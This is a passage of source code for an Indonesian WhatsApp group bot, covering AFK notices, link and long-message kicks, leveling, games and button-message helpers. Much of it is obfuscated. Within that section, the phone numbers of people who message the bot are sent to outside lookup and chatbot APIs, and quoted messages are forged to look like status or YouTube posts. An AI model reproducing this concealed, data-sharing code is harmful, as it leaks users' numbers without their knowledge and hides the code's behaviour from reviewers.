            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
    if (isGroup && !mek.key.fromMe && isAntiLink && !isGroupAdmins && !isOwner && !isCreator && isBotGroupAdmins){
            if (chatxs.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply2(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya lu mengirimkan link grup, maaf lu bakalan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
     if (isGroup && isAntivirtex && !mek.key.fromMe && !isOwner) {
      if (budy.length > 1000) {
        if (isGroupAdmins) return reply("admin bebas");
        reply2("「 A N T I V I R T E X  D E T E C T E D 」 \n\nMaaf Kamu Akan Dikick");
        alpha.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isRegister && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								await alpha.sendMessage(`* 「 LEVEL UP 」 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* ${getBalance(sender, balance)}\n👛 *Dompet :* ${checkATMuser(sender)}\n📛 *Role :* ${role}\n\nCongrats 🎉`,text, {quoted: mek, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
								}
							} catch (err) {
								console.error(err)
							}
						}
    alpha.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
            fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     alpha.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync(`./image/${thumbnail}`), sendEphemeral: true, contextInfo:{mentionedJid:alpha.parseMention(ckck)}})
                }}}}})

        if (isGroup) {
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        reply2(`@${ment.split('@')[0]} sedang AFK\n\n*Reason :* ${getReason}\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu\n`)
                        alpha.sendMessage(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid: alpha.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
                    reply2(`@${sender.split('@')[0]} telah kembali dari AFK\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`)
                }
            }

            function addMetadata(packname, author) {
    if (!packname) packname = `${botname}`; if (!author) author = ` ${peknem}`;
    author = author.replace(/[^a-zA-Z0-9]/g, '');
    //let name = `data`

    if (fs.existsSync(`./sticker/data.exif`)) {
        return `./sticker/data.exif`
    }
    const json = {
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
    }

    const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
    const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

    let len = JSON.stringify(json).length
    let last

    if (len > 256) {
        len = len - 256
        bytes.unshift(0x01)
    } else {
        bytes.unshift(0x00)
    }

    if (len < 16) {
        last = len.toString(16)
        last = "0" + len
    } else {
        last = len.toString(16)
    }

    const buf2 = Buffer.from(last, "hex")
    const buf3 = Buffer.from(bytes)
    const buf4 = Buffer.from(JSON.stringify(json))

    const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

    fs.writeFile(`./sticker/data.exif`, buffer, (err) => {
        return `./sticker/data.exif`
    }
    )
}
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                const  timestampi = speed();
				const  latensii = speed() - timestampi
				const latensiii = `${latensii.toFixed(4)} _Second_`
				const ini_gcchat = `${giid.length}`
				const uptime = process.uptime()
			    const tekss = `${kyun(uptime)}`
			    const ini_totalchat = `${totalchat.length - giid.lenght}`

const replyy = (teks) => {
			alpha.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
/////
 for (let zeeone of setiker){
	if (budy === zeeone){
		result = fs.readFileSync(`./media/sticker/${zeeone}.webp`)
		alpha.sendMessage(from, result,sticker, {quoted : ftroli})
		}
}
for (let zeeonee of audionye){
	if (budy === zeeonee){
		result = fs.readFileSync(`./media/audio/${zeeonee}.mp3`)
		alpha.sendMessage(from, result, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true, quoted : ftroli})
		}
}
for (let zeeoneee of imagenye){
	if (budy === zeeoneee){
		result = fs.readFileSync(`./media/foto/${zeeoneee}.jpg`)
		alpha.sendMessage(from, result,image, {quoted : ftroli})
		}
}
for (let zeeonew of videonye){
	if (budy === zeeonew){
		result = fs.readFileSync(`./media/video/${zeeonew}.mp4`)
		alpha.sendMessage(from, result,video, {mimetype: 'video/mp4', duration: 359996400, quoted: ftroli})
		}
}  
for (let i = 0; i < filter.length ; i++) {
      if (budy == filter[i].Filter) {
      alpha.sendMessage(from, filter[i].Jawaban, text, {quoted: mek})
      }
      }  
// TEBAK GAMBAR
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("tumben bener bang")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// CAK LONTONG
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("tumben bener bang")
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// FAMILY 100
if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = family[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete family[sender.split('@')[0]]
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// TEBAK ANIME
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("njir bener, pasti wibu")
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                } else {
                    reply("Jawaban Salah!")
                }
            }
           ////   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
		if (isCmd && isGroup){
		console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
		addBalance(sender, randomNomor(20), balance)
			}	
            //await alpha.updatePresence(from, Presence.recording)
            //await alpha.updatePresence(from, Presence.composing)
        if (!mek.key.fromMe && !isOwner && !isCreator && banChats === true) return
(function(_0x210e85,_0x346128){const _0x1bb839=_0x210e85();function _0x249e96(_0x8c7260,_0x158397,_0x1a5adf,_0x2a40a3){return _0x3a08(_0x1a5adf-0x29b,_0x8c7260);}function _0x3110ad(_0x4a6239,_0x3e13c5,_0x4b3f18,_0x5f51c5){return _0x3a08(_0x4b3f18-0x144,_0x5f51c5);}while(!![]){try{const _0x3857de=-parseInt(_0x249e96(0x76f,0x470,0x5fa,0x53d))/(-0x19c7+-0x7*0x269+0x2aa7)+parseInt(_0x249e96(0xdd,0x74d,0x576,0x64c))/(0x8*0x388+0x3fe+-0x2*0x101e)*(-parseInt(_0x3110ad(0x12c,0x95d,0x532,0x765))/(-0x1*0xb2d+0xc1b+-0xeb))+-parseInt(_0x249e96(0x6ff,0xb22,0x8fa,0x548))/(-0x3*-0xb65+0x9e2*0x1+-0x2c0d)+-parseInt(_0x3110ad(0x46e,0x193,0x5c6,0x5bb))/(-0x141c+0x4*-0x711+0x3065)*(-parseInt(_0x3110ad(0x9a8,0xa9e,0xab9,0xf62))/(0x9bd+-0x15fa+-0x49*-0x2b))+parseInt(_0x3110ad(0x679,0x6e8,0x659,0x80f))/(-0xce1+0x1676+-0x4c7*0x2)+-parseInt(_0x249e96(0x59a,0x84c,0x895,0x8da))/(0x1b8f+-0x6f2+-0x1495)+parseInt(_0x3110ad(0x4f6,0x145,0x3ec,0x619))/(0x51f*-0x1+-0x1a28+0x1f50)*(parseInt(_0x249e96(0x1a9,0x73b,0x65a,0x7c8))/(-0x445+0xd05+-0x8b6));if(_0x3857de===_0x346128)break;else _0x1bb839['push'](_0x1bb839['shift']());}catch(_0x532ab1){_0x1bb839['push'](_0x1bb839['shift']());}}}(_0x1139,0xd7c7e+-0x107507+-0x5*-0x2f876));const reply=_0x36052e=>{const _0x48b220={};_0x48b220['pIRTo']=_0x29ade1(-0x120,-0x33,-0x5c7,-0x2d8);function _0x4cdf43(_0x4caa10,_0x1b7802,_0x21f832,_0x8d2d7e){return _0x3a08(_0x8d2d7e- -0xb2,_0x4caa10);}const _0x5148ae=_0x48b220;function _0x29ade1(_0x4efc33,_0x2e88c9,_0x1419b9,_0x18fa0e){return _0x3a08(_0x4efc33- -0x3e0,_0x18fa0e);}alpha[_0x29ade1(-0x24a,-0x161,0x12d,-0x66e)+'e'](from,_0x36052e,text,{'quoted':mek,'contextInfo':{'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':_0x5148ae[_0x29ade1(-0x28b,-0x5d4,-0x565,-0x3bb)],'thumbnailUrl':'','thumbnail':fs[_0x29ade1(0xee,-0x87,0xa5,-0x7f)+'nc'](_0x29ade1(0x389,0x260,0x6ec,0x1c6)+thumbnail),'sourceUrl':''+apiku}}});};if(!isGroup&&!isCmd&&!command&&!mek['key']['fromMe']&&!autorespon){const _0x27182f={};_0x27182f['method']=_0x39f25f(0x3d9,0x288,0x5aa,-0x10),numd=await fetchJson(_0x1f7707(0x2e5,0x779,0x58e,0x4c7)+'i.telnyx.c'+'om/anonymo'+_0x39f25f(0x454,0x86,-0x412,0x3be)+_0x1f7707(-0xc0,-0x1f0,-0x71,-0x526)+senderNumber,_0x27182f),simi=await fetchJson(_0x39f25f(0x2e4,0x73c,0x65d,0x925)+_0x1f7707(0x1db,0x680,0x648,0x347)+_0x1f7707(0x10e,0x18d,0x4fb,0x239)+'='+numd[_0x39f25f(0x73c,0x513,0x121,0x260)]['country_co'+'de']+(_0x1f7707(0x46b,0x67d,0x5ae,0x7ec)+_0x39f25f(0x720,0x70a,0x4e5,0x24e))+cmd),sami=simi['success'];const _0x5a56b3={};_0x5a56b3[_0x39f25f(0x53f,0x6ba,0x30f,0xa70)+'Score']=0x1fc,_0x5a56b3['isForwarde'+'d']=!![],alpha['sendMessag'+'e'](from,'_'+sami+'_',text,{'thumbnail':fs[_0x1f7707(0x269,0x437,0x106,0x261)+'nc'](_0x1f7707(0x1e9,-0x135,-0xbf,0x103)+thumbnail),'sendEphemeral':!![],'quoted':mek,'contextInfo':_0x5a56b3});}const sendMenuWithFakeYt=(_0xf8ee7e,_0x514b88,_0x1221a7,_0x56e6c8,_0xad3c03)=>{const _0x4f9527={};_0x4f9527['sVZCv']=_0x75e8a(0xd44,0x531,0x96c,0x892)+_0x75e8a(0xc18,0x78f,0x8d2,0xac2)+_0x75e8a(0x8b0,0x7be,0x4bd,0x868)+_0x326667(-0xfa,0xb5,-0x2fd,0x107)+'bid=111226'+_0x326667(0x4a3,0x8f4,0x870,0x698)+_0x326667(0x4a7,0x85a,0x46e,0x54c)+'83427031',_0x4f9527[_0x326667(0x5df,0x2ce,0x42f,0x91d)]=_0x326667(-0x9c,0x37d,0x1a9,0xf7)+_0x75e8a(0x214,0x28d,0x623,0x884)+_0x326667(-0xa9,0x358,-0x207,-0x434),_0x4f9527['yPhBt']=_0x75e8a(0xe48,0xd66,0xbf5,0xb89)+'w.instagra'+_0x326667(0x1de,0x6d,-0x1fc,-0xcf)+_0x75e8a(0xada,0xe29,0xdb3,0xe81)+'L1/?utm_me'+_0x75e8a(0xc69,0x7dd,0x90d,0xc4a)+_0x75e8a(0x294,0x370,0x5f8,0x9b2),_0x4f9527[_0x75e8a(0x548,0x9f0,0x727,0x331)]=function(_0xc27017,_0x20a3a3){return _0xc27017*_0x20a3a3;};function _0x326667(_0x2ce326,_0x39fcbd,_0x5b0cde,_0x16e21e){return _0x39f25f(_0x39fcbd,_0x2ce326- -0x91,_0x5b0cde-0x76,_0x16e21e-0x1ec);}_0x4f9527[_0x75e8a(0x7c5,0x26e,0x568,0x9b0)]=_0x75e8a(0x8d2,0x914,0x64c,0xa8f)+'21';const _0x3b0892=_0x4f9527;let _0x47c2c3=[_0x3b0892[_0x75e8a(0x9dc,0x7bf,0x62a,0x63d)],_0x3b0892[_0x326667(0x5df,0x794,0x8ef,0x1ec)],_0x3b0892[_0x326667(0x21f,-0xb,0x5c4,-0x112)],_0x75e8a(0xa8f,0x10ce,0xd4d,0xa93)+_0x326667(0x6a8,0x434,0x424,0x724)+_0x75e8a(0x124,0x45f,0x4d1,0x790)];var _0x4540f0=_0x47c2c3[Math['floor'](_0x3b0892[_0x326667(0x113,0x477,0xa4,0x1b)](Math['random'](),_0x47c2c3[_0x75e8a(0xcf4,0xfb7,0xbfd,0x90d)]))];const _0x729992={};_0x729992[_0x75e8a(0xef8,0xeb5,0xb62,0xc2a)]=_0x4540f0,_0x729992[_0x75e8a(0x886,0xdc6,0xaeb,0x7b4)]=0x2,_0x729992[_0x326667(-0x1a9,-0x34,-0x480,-0x2a7)]=''+ucapannya2,_0x729992['body']=''+creator,_0x729992['thumbnailU'+'rl']='';function _0x75e8a(_0x2131f6,_0xa5fc4f,_0x1d8ef4,_0x54c603){return _0x1f7707(_0x2131f6-0x24,_0x2131f6,_0x1d8ef4-0x731,_0x54c603-0xf3);}_0x729992[_0x75e8a(0x1073,0x7d0,0xc84,0xe7d)]=_0x514b88;const _0x56fffb={};_0x56fffb[_0x75e8a(0x9d8,0x6ee,0x94f,0x702)]='hi',_0x56fffb['forwarding'+_0x75e8a(0x928,0x7ac,0x731,0x94f)]=0x3b9aca00,_0x56fffb[_0x75e8a(0x1c8,0x8a0,0x5e0,0x51f)+'d']=!![],_0x56fffb[_0x326667(0x5f7,0x23a,0xa71,0x51a)+_0x75e8a(0x928,0xa9c,0x849,0xcd1)]=!![],_0x56fffb[_0x75e8a(0x8ef,0xd36,0xbc2,0xc68)+'id']=[_0x1221a7,_0x56e6c8,_0xad3c03],_0x56fffb[_0x326667(-0x13b,-0x51f,-0x3ad,0x117)+_0x326667(0x1e0,0x107,-0x22a,0x25d)]=_0x729992;const _0xfcd3db={};_0xfcd3db[_0x326667(0x8b,-0x1ab,0x13e,0x27)]=_0x3b0892[_0x75e8a(0x97c,0x247,0x568,0xd4)],_0xfcd3db[_0x75e8a(0x947,0x9cf,0xc60,0x905)+'o']=_0x56fffb,_0xfcd3db[_0x75e8a(0x8f2,0x281,0x689,0x290)]=fkontak,_0xfcd3db[_0x75e8a(0x103d,0xbec,0xc0b,0x8aa)+_0x326667(0x235,0x672,0x2ed,-0xa7)]=!![],alpha[_0x75e8a(0x19c,0x5f4,0x4ff,0x24f)+'e'](from,_0xf8ee7e,MessageType[_0x326667(0x182,0x18c,0x24c,-0x1df)+_0x326667(-0x11e,0x38d,0x6,0xab)],_0xfcd3db);},sendButMessage=(_0x1b1c57,_0x444204,_0x1476ed,_0x1a057e=[],_0x26e362={})=>{const _0x2e08c8={};_0x2e08c8['contentTex'+'t']=_0x444204,_0x2e08c8['footerText']=_0x1476ed,_0x2e08c8[_0x444f1e(0x234,0x6d3,0xac7,0x301)]=_0x1a057e,_0x2e08c8[_0x444f1e(0xb80,0x79d,0x4b4,0x593)]=0x1;function _0x41c6e3(_0x3d993a,_0x1ca999,_0x527c0b,_0x54fd0c){return _0x1f7707(_0x3d993a-0x1bc,_0x1ca999,_0x3d993a-0x658,_0x54fd0c-0xc3);}function _0x444f1e(_0x31cdd4,_0xc9bba8,_0x25143e,_0x4e6550){return _0x1f7707(_0x31cdd4-0x1e8,_0x31cdd4,_0xc9bba8-0x2e8,_0x4e6550-0xe9);}const _0x5723b8=_0x2e08c8;alpha[_0x41c6e3(0x426,-0x1c,0x823,0x682)+'e'](_0x1b1c57,_0x5723b8,MessageType['buttonsMes'+'sage'],_0x26e362);},sendButLocation=async(_0x3e366b,_0x1e21e1,_0x3cda7f,_0x52f4dd,_0x3bb72f=[],_0x529f38={})=>{function _0x243ad9(_0x111432,_0x3c4720,_0x577368,_0x5a473a){return _0x39f25f(_0x111432,_0x5a473a-0xe5,_0x577368-0x8a,_0x5a473a-0x97);}const _0x2d43c4={};_0x2d43c4[_0x587519(0x6e0,0x623,0x8d6,0x535)]=_0x587519(0x64e,0x962,0x8dd,0x659)+'essage';const _0x501c1c=_0x2d43c4;kma=_0x52f4dd;const _0x4b5944=await alpha[_0x243ad9(0x2c9,0x353,0x4ec,0x1c0)+_0x587519(-0x1ed,-0x4a5,0x8,-0x9)](_0x3e366b,kma,MessageType[_0x587519(0x10d,0x4f7,0x30e,0x559)],{'thumbnail':kma});mhan=_0x4b5944[_0x587519(0x2f4,0x28c,-0x2ca,-0x58)][_0x501c1c[_0x587519(0x488,0x609,0x3ea,0x535)]]?_0x4b5944[_0x587519(0x2e8,-0x1bc,0x2a8,-0x58)][_0x587519(0x702,0x1aa,0x51b,0x659)+'essage']:_0x4b5944;const _0x9ded30={};_0x9ded30[_0x587519(0x197,0x322,0x46b,0x120)+_0x243ad9(0x822,0x66f,0x5d1,0x588)]=mhan[_0x587519(0x3f2,-0x451,-0x406,-0x58)][_0x587519(0x1ce,-0x317,-0x1ad,0x120)+_0x243ad9(0x395,0x5d1,0x62d,0x588)],_0x9ded30['contentTex'+'t']=_0x1e21e1;function _0x587519(_0xd62429,_0x13a14d,_0x45b8d3,_0x4a665f){return _0x39f25f(_0xd62429,_0x4a665f-0x84,_0x45b8d3-0xe4,_0x4a665f-0x1a3);}_0x9ded30[_0x243ad9(0x5f5,0x8bb,0x982,0x8ca)]=_0x3cda7f,_0x9ded30[_0x243ad9(0x563,0x9d4,0x8ed,0x67e)]=_0x3bb72f,_0x9ded30[_0x243ad9(0x994,0x82b,0xae7,0x748)]=0x6;const _0x480fdd=_0x9ded30;alpha[_0x587519(-0x4a8,-0x1f0,-0x159,0x0)+'e'](_0x3e366b,_0x480fdd,MessageType[_0x587519(0x3bb,0x249,-0x1b1,0x297)+'sage'],_0x529f38);},sendButDoc=async(_0x5c3f1e,_0x42e6af,_0x1764ce,_0xafeb1d=[],_0x582e96={})=>{const _0x25b803={};_0x25b803['lgUZv']=_0x2d754d(0x664,0x399,0x37e,-0x30)+'n/pdf',_0x25b803[_0x57ac01(0x46d,0x4a6,0x5c4,0x8d9)]=_0x57ac01(0x65a,0x314,0x521,0x251)+'ot';function _0x2d754d(_0x3f7a7c,_0x422c1e,_0x488081,_0x19abc9){return _0x1f7707(_0x3f7a7c-0x1bc,_0x19abc9,_0x422c1e-0x14e,_0x19abc9-0x78);}_0x25b803[_0x57ac01(0x47f,0x435,0x16,0x913)]=_0x2d754d(0xb9a,0x74e,0xa66,0x487);const _0x3aa380=_0x25b803,_0x2a988d={};_0x2a988d[_0x2d754d(0x28a,0x31d,0x14d,0x432)]=_0x3aa380[_0x2d754d(0x1fb,0x5d6,0x2dc,0x231)],_0x2a988d[_0x2d754d(-0x10,0x45c,0x913,0x1d8)]=0x65dd0837000,_0x2a988d['filename']=_0x3aa380[_0x2d754d(0x4b,0x2d8,0x55f,-0xfb)];let _0x108bdc=await alpha[_0x2d754d(-0x1f2,0x7b,-0x16e,-0x156)+'sage'](_0x5c3f1e,fs[_0x57ac01(0x3e9,0x45d,0x253,0x1e5)+'nc']('./image/'+thumbnail),MessageType[_0x57ac01(0x30,0x47a,0x396,-0x3a1)],_0x2a988d);getdoc=_0x108bdc['message']['ephemeralM'+_0x57ac01(0x37d,0x114,-0xa1,0x4f9)]?_0x108bdc[_0x57ac01(0x59,0x1d,0x42d,0x211)][_0x2d754d(0x8bb,0x575,0x566,0x6c2)+_0x2d754d(-0x284,0x1e8,0x19,0x462)]:_0x108bdc;const _0x40558e={};_0x40558e[_0x2d754d(-0x5c6,-0x177,-0x55d,0x203)+'ssage']=getdoc[_0x57ac01(0x59,0x1e4,0x48e,0x450)][_0x2d754d(-0x34e,-0x177,0x23,-0x60e)+_0x57ac01(0x5d8,0x3b8,0x30b,0x807)],_0x40558e['contentTex'+'t']=_0x42e6af,_0x40558e[_0x2d754d(0x88b,0x785,0xb39,0x44b)]=_0x1764ce,_0x40558e['buttons']=_0xafeb1d;function _0x57ac01(_0x2a5363,_0x558c16,_0x213fd8,_0xa11d97){return _0x39f25f(_0xa11d97,_0x2a5363-0x135,_0x213fd8-0x16d,_0xa11d97-0x1ba);}_0x40558e[_0x57ac01(0x798,0x938,0x567,0x5e6)]=_0x3aa380['VcBfU'];const _0x20abb5=_0x40558e;alpha['sendMessag'+'e'](_0x5c3f1e,_0x20abb5,MessageType['buttonsMes'+_0x57ac01(0xa8,0x3fc,-0x3da,-0x337)],_0x582e96);},sendButVideo=async(_0x4cbdb1,_0x31cbdf,_0x3c02e3,_0x334a75,_0x4d1746=[],_0x461702={})=>{const _0x6f92a0={};function _0x41c736(_0x43a5b1,_0x5e7210,_0x1a1203,_0x123d44){return _0x39f25f(_0x1a1203,_0x5e7210-0x3cd,_0x1a1203-0x165,_0x123d44-0x1f2);}_0x6f92a0[_0x41c736(0x53f,0x5e1,0x745,0x880)]=_0x150ec0(0x8a5,0xa89,0x840,0xb01)+'essage';const _0x1f7a09=_0x6f92a0;kma=_0x334a75;const _0x37750b=await alpha[_0x41c736(0x7bf,0x4a8,0x520,0x2b0)+'sage'](_0x4cbdb1,kma,MessageType['video']);mhan=_0x37750b[_0x41c736(0x49a,0x2f1,0x5c8,0x46a)][_0x1f7a09['tySYg']]?_0x37750b[_0x150ec0(0x4c5,0x796,0x1c0,0x450)][_0x41c736(0x933,0x9a2,0x962,0x837)+_0x150ec0(0x4da,0xaa9,0x862,0x774)]:_0x37750b;const _0x49c657={};_0x49c657[_0x41c736(0x809,0x552,0x96e,0x943)+'ge']=mhan[_0x150ec0(0x840,0x79,0x2c1,0x450)][_0x150ec0(0x2f7,0x64b,0x63c,0x6b1)+'ge'],_0x49c657[_0x41c736(0x4c1,0x7a4,0x975,0x7fa)+'t']=_0x31cbdf,_0x49c657['footerText']=_0x3c02e3,_0x49c657[_0x150ec0(0xec2,0xd23,0xc8f,0xac5)]=_0x4d1746,_0x49c657['headerType']=0x5;const _0x41090b=_0x49c657;function _0x150ec0(_0x46b366,_0x12ec76,_0x22f32e,_0x32c6bb){return _0x39f25f(_0x22f32e,_0x32c6bb-0x52c,_0x22f32e-0x110,_0x32c6bb-0x31);}alpha['sendMessag'+'e'](_0x4cbdb1,_0x41090b,MessageType[_0x150ec0(0xba2,0x696,0x28f,0x73f)+_0x150ec0(0x92d,0x411,0x7b,0x49f)],_0x461702);},sendButImage=async(_0x10df6e,_0x1152ca,_0x499495,_0x1cf6ef,_0x4fecb8=[],_0x4da595={})=>{kma=_0x1cf6ef;const _0x2dba75=await alpha[_0x19f15b(0x43d,0xea,0xa8,-0x15f)+_0x19f15b(-0x402,-0x7e,0x17,-0x135)](_0x10df6e,kma,MessageType[_0x19f15b(-0x405,0x60,-0x3e1,-0x1fb)],{'thumbnail':Buffer[_0x19f15b(0x265,0x103,-0xd1,-0x44)](-0x1*-0x4cf+-0x2*-0x529+-0xf21)});function _0x19f15b(_0x13cacb,_0x5cc813,_0x3d8b9c,_0x1e0861){return _0x39f25f(_0x1e0861,_0x5cc813-0xf,_0x3d8b9c-0xf8,_0x1e0861-0xe4);}mhan=_0x2dba75[_0x19f15b(-0x2dd,-0xcd,-0x154,-0x35b)][_0x19f15b(0x846,0x5e4,0x6b7,0x596)+_0x19f15b(0xb0,0x257,-0x96,0x271)]?_0x2dba75[_0x3cef19(-0xff,0x6c,0x8,-0xc5)][_0x19f15b(0x6f9,0x5e4,0x835,0x911)+'essage']:_0x2dba75;const _0x2358e4={};_0x2358e4[_0x3cef19(-0x70,-0x394,0x16,0x41d)+'ge']=mhan['message'][_0x3cef19(-0x70,-0x296,0x366,-0xca)+'ge'],_0x2358e4['contentTex'+'t']=_0x1152ca,_0x2358e4[_0x19f15b(0xab0,0x7f4,0x897,0xa2d)]=_0x499495,_0x2358e4[_0x3cef19(0x576,0x90a,0x819,0x6a6)]=_0x4fecb8,_0x2358e4['headerType']=0x4;const _0x53c756=_0x2358e4;function _0x3cef19(_0x58ffe3,_0x42dd53,_0x43d211,_0x5b834d){return _0x1f7707(_0x58ffe3-0x38,_0x42dd53,_0x58ffe3-0x18b,_0x5b834d-0x145);}alpha[_0x3cef19(-0xa7,0x1e6,0x68,0xc4)+'e'](_0x10df6e,_0x53c756,MessageType[_0x3cef19(0x1f0,0x419,0x2f1,-0x27f)+_0x19f15b(-0x429,-0x7e,-0x205,0x2dc)],_0x4da595);};if(autoregister){if(autoregister===![])return;const _0x214fa3={};_0x214fa3[_0x1f7707(-0x49e,-0x15f,-0x1ae,-0x1c1)+'t']=_0x1f7707(0x720,0x401,0x5a2,0x264);const _0x36a5e4={};_0x36a5e4['buttonId']='verify',_0x36a5e4[_0x39f25f(0x523,0x37c,0x7a3,-0x121)]=_0x214fa3,_0x36a5e4['type']='RESPONSE';const _0x2f2970={};_0x2f2970['displayTex'+'t']='DISABLE\x20VE'+'RIFY';const 